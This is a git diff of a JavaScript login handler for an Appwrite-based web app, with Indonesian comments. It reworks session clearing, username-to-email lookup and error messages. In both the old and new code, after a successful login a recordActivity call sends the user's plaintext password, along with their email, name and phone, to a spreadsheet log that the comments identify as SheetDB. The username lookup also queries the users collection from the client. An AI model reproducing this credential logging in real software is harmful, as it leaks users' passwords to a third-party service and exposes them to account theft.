@@ -371,29 +371,90 @@ if(el('signupForm')) {
     });
 }
 
-// Logic Login
-if(el('loginForm')) {
+// ======================================================
+// PERBAIKAN LOGIKA LOGIN (ANTI-MACET)
+// ======================================================
+if (el('loginForm')) {
     el('loginForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        let inputId = el('loginEmail').value.trim(); const pass = el('loginPass').value;
-        showLoading();
+        e.preventDefault(); // Mencegah reload halaman
+        
+        let inputId = el('loginEmail').value.trim();
+        const pass = el('loginPass').value;
+        
+        showLoading(); // Tampilkan loading spinner
+
         try {
-            // Cek jika input bukan email (Username)
-            if (!inputId.includes('@')) {
-                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', inputId)]);
-                if (res.total === 0) throw new Error("User tidak ditemukan");
-                inputId = res.documents[0].email;
+            // 1. CEK & BERSIHKAN SESI LAMA (PENTING!)
+            // Seringkali login gagal karena sesi lama masih "nyangkut"
+            try {
+                await account.get(); // Cek apakah sudah login?
+                // Jika sukses get(), berarti sudah login. Kita logout dulu biar bersih.
+                await account.deleteSession('current');
+            } catch (err) {
+                // Jika error, berarti memang belum login (bagus)
             }
-            // Buat sesi login
-            try { await account.createEmailPasswordSession(inputId, pass); } catch(err) { throw new Error("Password salah atau akun tidak ditemukan"); }
-            
+
+            // 2. LOGIKA LOGIN MENGGUNAKAN USERNAME
+            // Jika input tidak mengandung '@', kita anggap itu Username
+            if (!inputId.includes('@')) {
+                try {
+                    const res = await databases.listDocuments(
+                        CONFIG.DB_ID, 
+                        CONFIG.COLLECTION_USERS, 
+                        [Appwrite.Query.equal('name', inputId)]
+                    );
+                    
+                    if (res.total === 0) {
+                        throw new Error("Username tidak ditemukan. Coba gunakan Email.");
+                    }
+                    
+                    // Ganti inputId dengan email yang ditemukan dari database
+                    inputId = res.documents[0].email;
+                    
+                } catch (dbError) {
+                    // Jika gagal akses DB (misal masalah permission), lempar error
+                    console.error("Gagal mencari username:", dbError);
+                    throw new Error("Gagal memverifikasi username. Silakan login dengan Email.");
+                }
+            }
+
+            // 3. EKSEKUSI LOGIN (BUAT SESI BARU)
+            await account.createEmailPasswordSession(inputId, pass);
+
+            // 4. AMBIL DATA USER SETELAH LOGIN SUKSES
             const userAuth = await account.get();
-            let userPhone = "-";
-            try { const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, userAuth.$id); userPhone = userDB.phone || "-"; } catch(e){}
             
-            await recordActivity('Login', { id: userAuth.$id, name: userAuth.name, email: userAuth.email, phone: userPhone, password: pass });
-            checkSession();
-        } catch (error) { alert(error.message); hideLoading(); }
+            // Ambil data tambahan (No HP) dari database untuk log Excel
+            let userPhone = "-";
+            try {
+                const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, userAuth.$id);
+                userPhone = userDB.phone || "-";
+            } catch (e) { console.log("Data tambahan user tidak ditemukan"); }
+
+            // Catat ke Excel (SheetDB)
+            await recordActivity('Login', { 
+                id: userAuth.$id, 
+                name: userAuth.name, 
+                email: userAuth.email, 
+                phone: userPhone, 
+                password: pass 
+            });
+
+            // 5. REDIRECT KE DASHBOARD
+            checkSession(); 
+
+        } catch (error) {
+            // Tampilkan pesan error yang jelas kepada user
+            console.error("Login Error:", error);
+            
+            let pesan = "Login Gagal. Periksa koneksi internet.";
+            if (error.message.includes('Invalid credentials')) pesan = "Email atau Password salah!";
+            else if (error.message.includes('Username tidak ditemukan')) pesan = error.message;
+            else if (error.message.includes('Gagal memverifikasi')) pesan = error.message;
+            
+            alert(pesan);
+            hideLoading();
+        }
     });
 }
 
